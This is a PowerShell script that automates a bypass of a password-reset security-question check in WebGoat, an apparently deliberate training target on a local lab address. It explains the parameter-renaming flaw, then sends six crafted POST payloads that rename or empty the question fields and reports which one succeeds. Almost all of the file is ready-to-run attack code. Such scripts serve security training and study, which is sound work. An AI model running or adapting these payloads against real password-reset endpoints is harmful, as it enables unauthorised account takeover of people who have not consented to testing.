# 2FA Password Reset Bypass
# PowerShell automation script

Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host "  2FA Password Reset - Authentication Bypass" -ForegroundColor Cyan
Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host ""

$baseUrl = "http://192.168.254.112:8001"
$endpoint = "/WebGoat/auth-bypass/verify-account"
$userId = "12309746"  # Update if your userId is different

Write-Host "Target: $baseUrl$endpoint" -ForegroundColor Yellow
Write-Host "User ID: $userId" -ForegroundColor White
Write-Host ""

Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host "The Vulnerability:" -ForegroundColor Yellow
Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "Server checks: 'Did I receive 2 parameters?'" -ForegroundColor White
Write-Host "Server DOESN'T check: 'Are they the CORRECT parameters?'" -ForegroundColor Red
Write-Host ""
Write-Host "Normal: secQuestion0=answer1&secQuestion1=answer2&jsEnabled=1&..." -ForegroundColor Gray
Write-Host "Bypass: secQuestion2=anything&secQuestion3=anything&jsEnabled=1&..." -ForegroundColor Green
Write-Host ""

# Define attack payloads
$attacks = @(
    @{
        name = "Attack 1: Rename to Question 2 & 3"
        payload = "secQuestion2=bypass&secQuestion3=attack&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=$userId"
        desc = "Skip 0 & 1, use 2 & 3"
    },
    @{
        name = "Attack 2: Rename to Question 1 & 2"
        payload = "secQuestion1=test&secQuestion2=test&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=$userId"
        desc = "Skip 0, use 1 & 2"
    },
    @{
        name = "Attack 3: Higher Numbers"
        payload = "secQuestion5=answer&secQuestion6=answer&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=$userId"
        desc = "Use numbers 5 & 6"
    },
    @{
        name = "Attack 4: Non-sequential"
        payload = "secQuestion0=value&secQuestion2=value&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=$userId"
        desc = "Use 0 & 2, skip 1"
    },
    @{
        name = "Attack 5: Wrong Names"
        payload = "secQuestionX=bypass&secQuestionY=bypass&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=$userId"
        desc = "Use X & Y instead of numbers"
    },
    @{
        name = "Attack 6: Empty Values"
        payload = "secQuestion2=&secQuestion3=&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=$userId"
        desc = "Renamed parameters with empty values"
    }
)

Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host "Trying Bypass Techniques..." -ForegroundColor Green
Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host ""

foreach ($attack in $attacks) {
    Write-Host "$($attack.name)" -ForegroundColor Yellow
    Write-Host "  Description: $($attack.desc)" -ForegroundColor Gray
    Write-Host "  Payload: $($attack.payload)" -ForegroundColor White
    Write-Host ""

    try {
        $response = Invoke-WebRequest -Uri "$baseUrl$endpoint" `
            -Method POST `
            -ContentType "application/x-www-form-urlencoded" `
            -Body $attack.payload `
            -UseBasicParsing

        Write-Host "  ✅ Status: $($response.StatusCode)" -ForegroundColor Green
        
        try {
            $json = $response.Content | ConvertFrom-Json
            
            if ($json.lessonCompleted -or $json.verified -or $json.success) {
                Write-Host ""
                Write-Host "=====================================================================" -ForegroundColor Green
                Write-Host "  🎉 BYPASS SUCCESSFUL!" -ForegroundColor Green
                Write-Host "=====================================================================" -ForegroundColor Green
                Write-Host ""
                Write-Host "Working Attack: $($attack.name)" -ForegroundColor Yellow
                Write-Host "Payload: $($attack.payload)" -ForegroundColor White
                Write-Host ""
                Write-Host "Response:" -ForegroundColor Cyan
                Write-Host $response.Content -ForegroundColor Gray
                Write-Host ""
                exit 0
            }
            
            if ($json.feedback) {
                Write-Host "  Feedback: $($json.feedback)" -ForegroundColor Gray
            }
        }
        catch {
            Write-Host "  Response: $($response.Content.Substring(0, [Math]::Min(200, $response.Content.Length)))" -ForegroundColor Gray
        }
    }
    catch {
        Write-Host "  ❌ Error: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    Write-Host ""
}

Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host "All Attempts Complete" -ForegroundColor Yellow
Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "If none worked, the endpoint might be different." -ForegroundColor White
Write-Host ""
Write-Host "Try these endpoints manually:" -ForegroundColor Yellow
Write-Host "  /WebGoat/PasswordReset/verify" -ForegroundColor Gray
Write-Host "  /WebGoat/PasswordReset/verify-account" -ForegroundColor Gray
Write-Host "  /WebGoat/PasswordReset/questions/verify" -ForegroundColor Gray
Write-Host "  /WebGoat/authentication-bypasses/verify-account" -ForegroundColor Gray
Write-Host ""
Write-Host "Or use the HTML tool: auth_bypass_2fa.html" -ForegroundColor Cyan
